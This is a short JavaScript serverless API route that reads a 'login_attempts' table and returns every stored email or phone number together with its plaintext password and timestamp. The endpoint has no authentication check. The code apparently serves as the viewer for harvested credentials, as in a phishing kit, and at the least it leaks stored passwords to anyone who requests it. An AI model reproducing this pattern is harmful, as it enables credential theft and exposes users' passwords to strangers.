// api/login-attempts.js
import { sql } from "@vercel/postgres";

export default async function handler(req, res) {
  try {
    const { rows } = await sql`
      SELECT id, email_or_phone, password, created_at 
      FROM login_attempts 
      ORDER BY created_at DESC
    `;

    return res.status(200).json({ success: true, attempts: rows });
  } catch (error) {
    console.error("Error:", error);
    return res.status(500).json({
      success: false,
      message: "Server error occurred",
    });
  }
}
